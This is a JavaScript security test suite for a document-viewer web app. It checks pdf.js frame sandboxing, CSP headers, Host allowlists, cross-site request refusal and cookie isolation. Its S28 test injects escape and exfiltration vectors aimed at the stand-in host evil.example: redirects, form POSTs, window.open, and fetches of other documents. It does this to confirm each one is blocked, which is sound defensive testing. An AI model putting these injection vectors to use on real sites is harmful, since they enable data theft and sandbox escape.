// Security scenarios: canary positive control, viewer containment (S28) and the pdf.js allowlist (S29), app-origin
// headers / no-JS / cross-site (S24), Host checks (S14), robustness and caching (S63), the originals cookie jar (S57),
// cross-site access to originals (S62), and the run-wide CSP-console and network checks.
import { join } from 'node:path';
import { frameEvaluator } from '../lib/cdp.mjs';
import { nextPopup, openPage, sleep } from './browser.mjs';
import { nojsCase } from './cases.mjs';
import { ORIGINALS_HOSTNAME, PORTS, vpath } from './context.mjs';
import { ready } from './main-flow.mjs';

const J = JSON.stringify;
const docReady = (ref) => ready(`doc:${ref}`);
const linksOf = (p) => p.evaluate(`({ open: document.querySelector('#open-original')?.href ?? null, download: document.querySelector('#download-original')?.href ?? null })`);
const pathOf = (u) => { const x = new URL(u); return x.pathname + x.search; };

export async function canaryControl(ctx) {
	const { b, L } = ctx;
	return L.control('NET-CANARY control', async () => {
		const t0 = Date.now();
		const p = await openPage(b);
		try {
			await p.navigate('http://evil.example/canary-control', { timeout: 8000 }).catch(() => null);
			await sleep(800);
		} finally { await p.close(); }
		const hits = L.since(t0).controlHits.filter((h) => /evil\.example\/canary-control/.test(h));
		return { pass: hits.length >= 1, evidence: { controlHits: hits } };
	});
}

/** S28: script injected into the opaque pdf.js frame (as an attacker would have it) stays contained. */
export async function s28(ctx) {
	const { A, b, L, main } = ctx;
	const rv = main.resultsVersion;
	const p = ctx.p;
	await p.goto(`${A.v(rv)}/doc/OD-001`, docReady('OD-001'));
	const view = (await linksOf(p)).open;
	await p.goto(`${A.v(rv)}/doc/OD-002`, docReady('OD-002'));
	const other = await linksOf(p);
	const otherRaw = other.download.replace(/&download=1$/, '');
	const otherNoK = otherRaw.replace(/\?k=[^&]+/, '');
	const t = await openPage(b);
	const out = { view, vectors: {} };
	try {
		const fresh = async () => {
			await t.navigate(view);
			await t.waitFor(`document.body?.dataset.ready === '1'`, 20000);
			return frameEvaluator(b, t.sessionId, /\/_pdfjs\/[^/]+\/frame\.html/, 8000);
		};
		const f0 = await fresh();
		out.viewer = await f0(`({ origin: self.origin, ready: document.body.dataset.ready, canvases: document.querySelectorAll('canvas').length, where: ${J(f0.where)} })`);
		const ev = (u) => `http://evil.example/s28?p=${u}`;
		const vectors = {
			'location.href': `location.href = ${J(ev('href'))}; 'set'`,
			'location.assign': `location.assign(${J(ev('assign'))}); 'called'`,
			'meta refresh': `(() => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${ev('meta')}'; document.head.append(m); return 'appended'; })()`,
			'anchor click': `(() => { const x = document.createElement('a'); x.href = ${J(ev('anchor'))}; document.body.append(x); x.click(); return 'clicked'; })()`,
			'anchor target _top': `(() => { const x = document.createElement('a'); x.href = ${J(ev('anchor-top'))}; x.target = '_top'; document.body.append(x); x.click(); return 'clicked'; })()`,
			'window.open _blank': `String(!!window.open(${J(ev('wo-blank'))}, '_blank'))`,
			'window.open _self': `String(!!window.open(${J(ev('wo-self'))}, '_self'))`,
			'form POST': `(() => { const f = document.createElement('form'); f.method = 'POST'; f.action = ${J(ev('form'))}; document.body.append(f); f.submit(); return 'submitted'; })()`,
			'top.location': `(() => { try { top.location.href = ${J(ev('top'))}; return 'set'; } catch (e) { return 'blocked: ' + e.name; } })()`,
			'wrapper DOM': `(() => { try { const d = parent.document; d.body.dataset.pwned = '1'; return 'reached the wrapper DOM'; } catch (e) { return 'blocked: ' + e.name; } })()`,
			'read another original (with its k)': `fetch(${J(otherRaw)}).then((r) => r.text()).then((x) => 'READ ' + x.length, (e) => 'blocked: ' + e.name)`,
			'read another original (no k)': `fetch(${J(otherNoK)}).then((r) => r.text()).then((x) => 'READ ' + x.length, (e) => 'blocked: ' + e.name)`,
			'read another original (no-cors)': `fetch(${J(otherRaw)}, { mode: 'no-cors' }).then((r) => r.type + ':' + r.status + ':' + (r.type === 'opaque' ? 'unreadable' : 'readable'), (e) => 'blocked: ' + e.name)`,
			'cookie': `(() => { try { document.cookie = 'cc_probe=1; path=/'; return document.cookie.includes('cc_probe') ? 'cookie set' : 'not set'; } catch (e) { return 'blocked: ' + e.name; } })()`,
			'localStorage': `(() => { try { localStorage.setItem('x', '1'); return 'storage set'; } catch (e) { return 'blocked: ' + e.name; } })()`,
		};
		for (const [name, code] of Object.entries(vectors)) {
			const f = await fresh();
			const t0 = Date.now(), mk = b.mark();
			let r;
			try { r = await f(code); } catch (e) { r = `threw: ${String(e.message).slice(0, 100)}`; }
			await sleep(1200);
			const since = b.since(mk);
			const net = L.since(t0);
			const top = await t.evaluate(`({ href: location.href, pwned: document.body.dataset.pwned ?? null, frameSrc: document.querySelector('iframe#viewer')?.getAttribute('src') ?? null })`).catch((e) => ({ error: String(e) }));
			const tree = await t.s('Page.getFrameTree').catch(() => null);
			const frameUrl = tree?.frameTree.childFrames?.[0]?.frame.url ?? null;
			const popups = since.targets.filter((x) => x.type === 'page');
			for (const x of popups) await b.send('Target.closeTarget', { targetId: x.targetId }).catch(() => {});
			out.vectors[name] = { result: String(r).slice(0, 80), canary: net.realHits, offOrigin: net.offOriginRequests, popups: popups.map((x) => x.url), topStays: top.href === view, wrapperTouched: top.pwned, frameUrl, dialogs: since.dialogs.length };
		}
	} finally { await t.close(); }
	const v = Object.entries(out.vectors);
	const frameStayed = (x) => x.frameUrl === null || new URL(x.frameUrl).hostname === ORIGINALS_HOSTNAME || /^(chrome-error|about):/.test(x.frameUrl);
	const ok = out.viewer.origin === 'null' && out.viewer.ready === '1' && out.viewer.canvases > 0 &&
		v.every(([, x]) => x.canary.length === 0 && x.offOrigin.length === 0 && x.popups.length === 0 && x.topStays && x.wrapperTouched === null && x.dialogs === 0 && frameStayed(x)) &&
		/^blocked/.test(out.vectors['read another original (with its k)'].result) && /^blocked/.test(out.vectors['read another original (no k)'].result) &&
		/^(blocked|opaque:0:unreadable)/.test(out.vectors['read another original (no-cors)'].result) &&
		/^blocked/.test(out.vectors.cookie.result) && /^blocked/.test(out.vectors.localStorage.result) && /^blocked/.test(out.vectors['wrapper DOM'].result) && /^blocked/.test(out.vectors['top.location'].result);
	return { pass: ok, evidence: out };
}

/** S29: the pdf.js allowlist answers 404 (with CSP) for inherited keys and bad escapes; listed files 200. */
export async function s29(ctx) {
	const { A } = ctx;
	const v = (await A.c.health()).pdfjs;
	const out = {};
	for (const k of ['constructor', '__proto__', 'hasOwnProperty', 'toString', 'valueOf', '%E0%A4%A', '%ZZ', '..%2Fmanifest.json', 'manifest.json', 'pdf.sandbox.mjs', 'viewer.mjs', 'pdf.min.mjs', 'frame.html', 'wrapper.mjs']) {
		const r = await A.o(`/_pdfjs/${v}/${k}`);
		out[k] = { status: r.status, csp: r.headers['content-security-policy'] ?? null, nosniff: r.headers['x-content-type-options'] ?? null };
	}
	const listed = new Set(['viewer.mjs', 'pdf.min.mjs', 'frame.html', 'wrapper.mjs']);
	const otherVersion = (await A.o(`/_pdfjs/0.0.1/viewer.mjs`)).status;
	const ok = !!v && Object.entries(out).every(([k, r]) => (listed.has(k) ? r.status === 200 : r.status === 404) && !!r.csp && r.nosniff === 'nosniff') && otherVersion === 404;
	return { pass: ok, evidence: { pdfjs: v, out, otherVersion } };
}

const CSP_RE = /Content Security Policy|Content-Security-Policy|Refused to (load|execute|apply|frame|connect)/i;
const appPage = (ctx, url) => [ctx.A.origin, ctx.B.origin].some((o) => (url ?? '').startsWith(o));
const cspMessages = (ctx, from = 0) => ctx.b.events.console.filter((c) => c.at >= from && CSP_RE.test(c.text) && (appPage(ctx, c.target) || appPage(ctx, c.url)));

/** S24: CSP, Referrer-Policy and caching on app pages; no-JS import; cross-site POST and API refused. */
export async function s24(ctx) {
	const { A, b, main, sites } = ctx;
	const rv = main.resultsVersion;
	const pages = ['/cases', '/import', `${vpath(rv)}/overview`, `${vpath(rv)}/chronology`, `${vpath(rv)}/doc/OD-001`, `${vpath(rv)}/analysis/timeline`, '/recovery'];
	const hdr = {};
	for (const u of pages) {
		const r = await A.c.get(u);
		const csp = r.headers['content-security-policy'] ?? '';
		const script = /(?:^|;)\s*script-src ([^;]*)/.exec(csp)?.[1] ?? '';
		const nonce = /'nonce-([^']+)'/.exec(script)?.[1] ?? null;
		hdr[u] = { status: r.status, scriptSrc: script, nonce: !!nonce, nonceUsed: !!nonce && r.text.includes(`nonce="${nonce}"`), unsafeInline: /unsafe-inline|unsafe-eval/.test(script), styleUnsafeInline: /style-src[^;]*'unsafe-inline'/.test(csp),
			objectNone: /object-src 'none'/.test(csp), baseNone: /base-uri 'none'/.test(csp), frameAncestorsNone: /frame-ancestors 'none'/.test(csp), formActionSelf: /form-action 'self'/.test(csp),
			referrer: r.headers['referrer-policy'], cache: r.headers['cache-control'], nosniff: r.headers['x-content-type-options'], coop: r.headers['cross-origin-opener-policy'], inlineStyleAttrs: (r.text.match(/<[a-z][^>]*\sstyle="/gi) ?? []).length };
	}
	const n1 = /'nonce-([^']+)'/.exec((await A.c.get('/import')).headers['content-security-policy'] ?? '')?.[1];
	const n2 = /'nonce-([^']+)'/.exec((await A.c.get('/import')).headers['content-security-policy'] ?? '')?.[1];
	const headersOk = Object.values(hdr).every((h) => h.status === 200 && h.nonce && h.nonceUsed && !h.unsafeInline && !h.styleUnsafeInline && h.objectNone && h.baseNone && h.frameAncestorsNone && h.formActionSelf &&
		h.referrer === 'same-origin' && h.cache === 'no-store' && h.nosniff === 'nosniff' && h.coop === 'same-origin' && h.inlineStyleAttrs === 0) && n1 && n2 && n1 !== n2;
	// no-JS: a browser with script execution disabled fills and submits the plain form
	const nj = await nojsCase(join(ctx.tmp, 'nojs'));
	const attempts0 = A.results('SELECT count(*) AS n FROM import_attempt')[0].n;
	const q = await openPage(b, { fresh: true });
	let noJs;
	try {
		await q.s('Emulation.setScriptExecutionDisabled', { value: true });
		await q.navigate(`${A.origin}/import`);
		const posts = [];
		const off = b.on((m) => { if (m.sessionId === q.sessionId && m.method === 'Network.requestWillBeSent' && m.params.request.method === 'POST') posts.push({ url: m.params.request.url.replace(A.origin, ''), type: m.params.type, origin: m.params.request.headers.Origin ?? m.params.request.headers.origin ?? null }); });
		const focus = async (sel) => { const { root } = await q.s('DOM.getDocument', { depth: 0 }); const { nodeId } = await q.s('DOM.querySelector', { nodeId: root.nodeId, selector: sel }); await q.s('DOM.focus', { nodeId }); };
		await focus('#caseFolder'); await q.s('Input.insertText', { text: nj.caseDir });
		await focus('#packageSource'); await q.s('Input.insertText', { text: nj.pkgDir });
		const loaded = b.once((m) => m.sessionId === q.sessionId && m.method === 'Page.loadEventFired', 60000);
		await q.key('Enter');
		await loaded;
		off();
		noJs = { posts, ...(await q.evaluate(`({ path: location.pathname, verdict: document.querySelector('main')?.dataset.verdict ?? null, candidate: document.querySelector('#candidate-heading')?.textContent.trim() ?? null, hydrated: window.__ccMounted ?? null, kit: Object.keys(window).some((k) => k.startsWith('__sveltekit')) })`)) };
	} finally { await q.close(); }
	const attempts1 = A.results('SELECT count(*) AS n FROM import_attempt')[0].n;
	const noJsOk = noJs.posts.length === 1 && noJs.posts[0].url === '/import?/import' && noJs.posts[0].origin === A.origin && /^\/import\/\d+$/.test(noJs.path) && noJs.verdict === 'report' && noJs.candidate === 'Candidate' &&
		noJs.posts[0].type === 'Document' && noJs.hydrated === null && noJs.kit === false && attempts1 === attempts0 + 1;
	// cross-site POSTs: raw with Origin evil, a data: page (Origin null) and a page on another site (localhost:<port>)
	const raw = await A.raw('/import?/import', { origin: 'http://evil.example', 'content-type': 'application/x-www-form-urlencoded' }, 'POST', new URLSearchParams({ caseFolder: nj.caseDir, packageSource: nj.pkgDir }).toString());
	const statuses = [];
	const offX = b.on((m) => { if (m.method === 'Network.responseReceived' && m.params.response.url.startsWith(A.origin)) statuses.push(`${m.params.response.status} ${m.params.type} ${m.params.response.url.replace(A.origin, '')}`); });
	const formPage = `<form id=g method=POST action="${A.origin}/import?/import"><input name=caseFolder value="${nj.caseDir}"><input name=packageSource value="${nj.pkgDir}"></form>`;
	const x = await openPage(b);
	try {
		await x.navigate('data:text/html,' + encodeURIComponent(formPage));
		await x.evaluate(`document.getElementById('g').submit(); true`);
		await sleep(1500);
		await x.navigate(`http://localhost:${PORTS.XSITE}/`);
		await x.evaluate(`document.body.insertAdjacentHTML('beforeend', ${J(formPage)}); document.getElementById('g').submit(); true`);
		await sleep(1500);
		await x.navigate(`http://localhost:${PORTS.XSITE}/`);
		await x.evaluate(`fetch(${J(A.origin + '/api/health')}, { mode: 'no-cors' }).catch(() => null); true`);
		await sleep(800);
	} finally { await x.close(); offX(); }
	const attempts2 = A.results('SELECT count(*) AS n FROM import_attempt')[0].n;
	const host = `127.0.0.1:${A.port}`;
	const api = {
		crossSite: (await A.raw('/api/health', { 'sec-fetch-site': 'cross-site' })).status,
		sameSite: (await A.raw('/api/health', { 'sec-fetch-site': 'same-site' })).status,
		sameOrigin: (await A.raw('/api/health', { 'sec-fetch-site': 'same-origin' })).status,
		none: (await A.raw('/api/health', { 'sec-fetch-site': 'none' })).status,
		crossSiteChronology: (await A.raw(`/api/v/${encodeURIComponent(rv)}/chronology`, { 'sec-fetch-site': 'cross-site' })).status,
		crossSiteBrowse: (await A.raw('/api/browse', { 'sec-fetch-site': 'cross-site' })).status,
		sameOriginBrowse: (await A.raw('/api/browse', { 'sec-fetch-site': 'same-origin' })).status,
		nonJsonWrite: (await A.raw('/api/state', { origin: A.origin, 'content-type': 'text/plain' }, 'POST', 'x')).status,
	};
	const xsOk = raw.status === 403 && statuses.filter((s) => /^403 Document \/import\?\/import$/.test(s)).length === 2 && statuses.some((s) => /^403 \w+ \/api\/health$/.test(s)) && attempts2 === attempts1 &&
		api.crossSite === 403 && api.sameSite === 403 && api.sameOrigin === 200 && api.none === 200 && api.crossSiteChronology === 403 && api.crossSiteBrowse === 403 && api.sameOriginBrowse === 200 && api.nonJsonWrite === 415;
	const csp = cspMessages(ctx);
	return { pass: headersOk && noJsOk && xsOk && csp.length === 0, evidence: { headers: hdr, noncePerResponse: n1 !== n2, noJs, crossSite: { raw: raw.status, rawBody: raw.text.slice(0, 80), browser: statuses, attempts: [attempts0, attempts1, attempts2] }, api, host, cspViolationsSoFar: csp } };
}

/** S14 + W-HOST-03: exact Host allowlists on both listeners, including static assets. */
export async function s14(ctx) {
	const { A } = ctx;
	const v = (await A.c.health()).pdfjs;
	const rv = ctx.main.resultsVersion;
	const app = {}, orig = {};
	for (const path of ['/', '/import', '/api/health', '/_app/version.json', '/favicon.svg']) {
		app[path] = {};
		for (const h of [`evil.example:${A.port}`, 'evil.example', `localhost:${A.port}`, `${ORIGINALS_HOSTNAME}:${A.port}`, `127.0.0.1:${A.port}`]) app[path][h] = (await A.raw(path, { host: h })).status;
	}
	for (const path of ['/', `/_pdfjs/${v}/viewer.mjs`, `/o/${rv}/OD-001/x`, `/view/${rv}/OD-001`]) {
		orig[path] = {};
		for (const h of [`evil.example:${A.origPort}`, `127.0.0.1:${A.origPort}`, `localhost:${A.origPort}`, ORIGINALS_HOSTNAME, A.origHost]) orig[path][h] = (await A.o(path, { host: h })).status;
	}
	const ok = Object.values(app).every((m) => Object.entries(m).every(([h, s]) => (h === `127.0.0.1:${A.port}` ? s !== 421 : s === 421))) &&
		app['/_app/version.json'][`127.0.0.1:${A.port}`] === 200 && app['/favicon.svg'][`127.0.0.1:${A.port}`] === 200 && app['/api/health'][`127.0.0.1:${A.port}`] === 200 &&
		Object.values(orig).every((m) => Object.entries(m).every(([h, s]) => (h === A.origHost ? s !== 421 : s === 421))) && orig[`/_pdfjs/${v}/viewer.mjs`][A.origHost] === 200;
	return { pass: ok, evidence: { app, originals: orig } };
}

/** S63: POST ?/default is 400 (never 500); pages are no-store; the skip link is the first focusable element. */
export async function s63(ctx) {
	const { A, main } = ctx;
	const rv = main.resultsVersion;
	const reserved = {};
	for (const u of [`${vpath(rv)}/overview?/default`, '/import?/default', `${vpath(rv)}/doc/OD-001?/default`]) reserved[u] = (await A.c.form(u, { x: '1' })).status;
	const pages = {};
	for (const u of ['/cases', '/import', `/import/${ctx.mainImport.id}`, '/recovery', `${vpath(rv)}/overview`, `${vpath(rv)}/chronology`, `${vpath(rv)}/doc/OD-001`, `${vpath(rv)}/analysis/timeline`, `${vpath(rv)}/doc/NO-SUCH`]) {
		const r = await A.c.get(u);
		const firstFocusable = /<(a|button|input|select|textarea)\b[^>]*>/.exec(r.text)?.[0] ?? null;
		pages[u] = { status: r.status, cache: r.headers['cache-control'] ?? null, skipFirst: !!firstFocusable && /class="skip"/.test(firstFocusable) && /href="#main"/.test(firstFocusable), main: /<main id="main"/.test(r.text) };
	}
	const ok = Object.values(reserved).every((s) => s === 400) && Object.entries(pages).every(([u, x]) => x.status === (u.endsWith('NO-SUCH') ? 404 : 200) && x.cache === 'no-store' && x.skipFirst && x.main);
	return { pass: ok, evidence: { reserved, pages } };
}

/** S57: another localhost app's cookies (port-blind 'localhost' jar) never reach the originals site. */
export async function s57(ctx) {
	const { A, b, main, sites } = ctx;
	const p = await openPage(b);
	const cookieHeaders = [];
	const off = b.on((m) => { if (m.method === 'Network.requestWillBeSentExtraInfo' && m.sessionId === p.sessionId) cookieHeaders.push({ id: m.params.requestId, cookie: Object.entries(m.params.headers).find(([k]) => k.toLowerCase() === 'cookie')?.[1] ?? null, assoc: m.params.associatedCookies?.filter((c) => !c.blockedReasons?.length).map((c) => c.cookie.name) ?? [] }); });
	const urls = [];
	const offU = b.on((m) => { if (m.method === 'Network.requestWillBeSent' && m.sessionId === p.sessionId) urls.push({ id: m.params.requestId, url: m.params.request.url }); });
	let out;
	try {
		await p.navigate(`${sites.otherApp}/`);
		await p.evaluate(`document.cookie = 'other_app_js=1; path=/'; document.cookie = 'other_app_js_domain=1; domain=localhost; path=/'; true`);
		await p.navigate(`${sites.otherApp}/again`);
		const jar = async (u) => (await p.s('Network.getCookies', { urls: [u] })).cookies.map((c) => `${c.name}@${c.domain}`).sort();
		await p.goto(`${A.v(main.resultsVersion)}/doc/EM-0001`, docReady('EM-0001'));
		const open = (await linksOf(p)).open;
		await p.navigate(open);
		await sleep(300);
		const sent = (prefix) => urls.filter((u) => u.url.startsWith(prefix)).map((u) => ({ url: u.url.slice(0, 90), cookie: cookieHeaders.find((c) => c.id === u.id)?.cookie ?? null }));
		out = { otherAppJar: await jar(`${sites.otherApp}/`), originalsJar: await jar(`${A.orig}/`), appJar: await jar(`${A.origin}/`), sentToOtherApp: sent(sites.otherApp), sentToOriginals: sent(A.orig) };
	} finally { off(); offU(); await p.close(); }
	const again = out.sentToOtherApp.find((x) => x.url.endsWith('/again'));
	const ok = out.otherAppJar.length >= 2 && out.originalsJar.length === 0 && out.appJar.length === 0 && /other_app_session=1/.test(again?.cookie ?? '') &&
		out.sentToOriginals.length >= 1 && out.sentToOriginals.every((x) => x.cookie === null);
	return { pass: ok, evidence: out };
}

/** S62: cross-site access to originals: frames and fetches get one constant 403; a capability link navigates top-level. */
export async function s62(ctx) {
	const { A, b, main, sites } = ctx;
	const rv = main.resultsVersion;
	const p = ctx.p;
	await p.goto(`${A.v(rv)}/doc/EM-0001`, docReady('EM-0001'));
	const txt = await linksOf(p);
	await p.goto(`${A.v(rv)}/doc/OD-001`, docReady('OD-001'));
	const pdf = await linksOf(p);
	const XS_FRAME = { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'navigate', 'sec-fetch-dest': 'iframe' };
	const XS_DOC = { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'navigate', 'sec-fetch-dest': 'document' };
	const XS_FETCH = { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'no-cors', 'sec-fetch-dest': 'empty' };
	const t = pathOf(txt.open), v = pathOf(pdf.open);
	const missing = t.replace('/EM-0001/', '/EM-9999/');
	const raw = async (path, h) => { const r = await A.o(path, h); return { status: r.status, len: r.body.length, body: r.text.slice(0, 90) }; };
	const http = {
		frameExisting: await raw(t, XS_FRAME), frameMissing: await raw(missing, XS_FRAME), frameNoK: await raw(t.replace(/\?k=.*/, ''), XS_FRAME), frameViewer: await raw(v, XS_FRAME),
		fetchExisting: await raw(t, XS_FETCH), fetchMissingNoK: await raw(missing.replace(/\?k=.*/, ''), XS_FETCH), docNoK: await raw(t.replace(/\?k=.*/, ''), XS_DOC),
		docWrongK: await raw(t.replace(/k=[^&]+/, 'k=' + 'A'.repeat(32)), XS_DOC), docOtherRefsK: await raw(t.replace('/EM-0001/', '/OD-001/'), XS_DOC), sameSiteNoK: await raw(t.replace(/\?k=.*/, ''), { ...XS_DOC, 'sec-fetch-site': 'same-site' }),
		docWithK: await raw(t, XS_DOC), viewerWithK: await raw(v, XS_DOC), sameOriginNoK: await raw(t.replace(/\?k=.*/, ''), { 'sec-fetch-site': 'same-origin', 'sec-fetch-dest': 'empty' }),
	};
	const refused = ['frameExisting', 'frameMissing', 'frameNoK', 'frameViewer', 'fetchMissingNoK', 'docNoK', 'docWrongK', 'docOtherRefsK', 'sameSiteNoK'];
	// in the browser, from another site: frames and fetches of existing and missing originals
	const x = await openPage(b);
	const seen = [];
	const reqs = new Map(); // requestId -> { url, type, status, blocked }
	const off = b.on((m) => {
		if (m.method === 'Network.responseReceived' && m.params.response.url.startsWith(A.orig)) seen.push({ url: m.params.response.url, status: m.params.response.status, type: m.params.type });
		if (m.sessionId !== x.sessionId) return;
		const id = m.params?.requestId;
		if (m.method === 'Network.requestWillBeSent' && m.params.request.url.startsWith(A.orig)) reqs.set(id, { url: m.params.request.url, type: m.params.type, status: null, blocked: null });
		else if (m.method === 'Network.responseReceivedExtraInfo' && reqs.has(id)) reqs.get(id).status = m.params.statusCode;
		else if (m.method === 'Network.loadingFailed' && reqs.has(id)) reqs.get(id).blocked = m.params.blockedReason ?? m.params.errorText;
	});
	const dl0 = b.events.downloads.length;
	let browser;
	try {
		await x.navigate(`${sites.xsite}/`);
		const embed = (kind, url) => x.evaluate(`new Promise((res) => { const el = document.createElement(${J(kind)}); const t = setTimeout(() => res('timeout'), 3000); el.onload = () => { clearTimeout(t); res('load'); }; el.onerror = () => { clearTimeout(t); res('error'); }; el.src = ${J(url)}; document.body.append(el); })`);
		const fetchNoCors = (url) => x.evaluate(`fetch(${J(url)}, { mode: 'no-cors' }).then((r) => r.type + ':' + r.status, (e) => 'error:' + e.name)`);
		const fetchCors = (url) => x.evaluate(`fetch(${J(url)}).then((r) => 'read:' + r.status, (e) => 'error:' + e.name)`);
		const noK = (u) => u.replace(/\?k=[^#]*/, '');
		const missingUrl = txt.open.replace('/EM-0001/', '/EM-9999/');
		browser = {
			iframeExistingWithK: await embed('iframe', txt.open), iframeExistingNoK: await embed('iframe', noK(txt.open)), iframeMissing: await embed('iframe', missingUrl), iframeViewerWithK: await embed('iframe', pdf.open),
			fetchExistingNoK: await fetchNoCors(noK(txt.open)), fetchMissingNoK: await fetchNoCors(noK(missingUrl)), fetchCorsExistingWithK: await fetchCors(txt.open),
		};
		await sleep(500);
		browser.frameResponses = seen.filter((s) => s.type === 'Document').map((s) => `${s.status} ${s.url.includes('EM-9999') ? 'missing' : s.url.includes('/view/') ? 'viewer' : 'existing'}`);
		// a CORP-blocked response never reaches Network.responseReceived: its status comes from responseReceivedExtraInfo
		browser.fetchResponses = [...reqs.values()].filter((r) => r.type === 'Fetch').map((r) => `${r.status} ${r.type} ${r.url.includes('EM-9999') ? 'missing' : /[?&]k=/.test(r.url) ? 'existing+k' : 'existing'} ${r.blocked ?? 'delivered'}`);
		// with the link capability: a cross-site top-level navigation to the original works
		const n0 = seen.length;
		await x.navigate(txt.open);
		await sleep(300);
		browser.topLevel = { response: seen.slice(n0).map((s) => `${s.status} ${s.type}`), contentType: await x.evaluate('document.contentType'), url: await x.evaluate('location.href') };
	} finally { off(); await x.close(); }
	const bodies = new Set(refused.map((k) => `${http[k].status}:${http[k].len}:${http[k].body}`));
	const ok = refused.every((k) => http[k].status === 403) && bodies.size === 1 && http.fetchExisting.status === 200 && http.docWithK.status === 200 && http.viewerWithK.status === 200 && http.sameOriginNoK.status === 200 &&
		browser.frameResponses.length === 4 && browser.frameResponses.every((s) => s.startsWith('403 ')) && browser.fetchResponses.length === 3 &&
		browser.fetchResponses.slice(0, 2).every((s) => /^403 Fetch (existing|missing) /.test(s)) && /^error:/.test(browser.fetchCorsExistingWithK) && b.events.downloads.length === dl0 && browser.topLevel.response.includes('200 Document') && browser.topLevel.contentType === 'text/plain';
	return { pass: ok, evidence: { links: { txt: t, viewer: v }, http, constantRefusal: [...bodies], browser, downloads: b.events.downloads.length - dl0, note: 'a cross-site no-cors fetch WITH the capability is served (200) but opaque to the page (CORP same-origin, no CORS); without it, 403' } };
}

/** Run-wide: zero CSP violations reported by app pages. */
export async function cspConsole(ctx) {
	const all = cspMessages(ctx);
	return { pass: all.length === 0, evidence: { appPageCspMessages: all, consoleEntries: ctx.b.events.console.length } };
}

/** Run-wide: no real canary hit and no off-origin request from any target outside labelled controls. */
export async function netZero(ctx, t0) {
	const n = ctx.L.since(t0);
	return { pass: n.realHits.length === 0 && n.offOriginRequests.length === 0 && n.controlHits.length >= 1, evidence: { ...n, controls: ctx.L.controls.map((c) => c.label), backgroundRule: 'Google service host, no Origin/Referer, not a suite beacon path: browser-process background traffic, recorded but not counted' } };
}
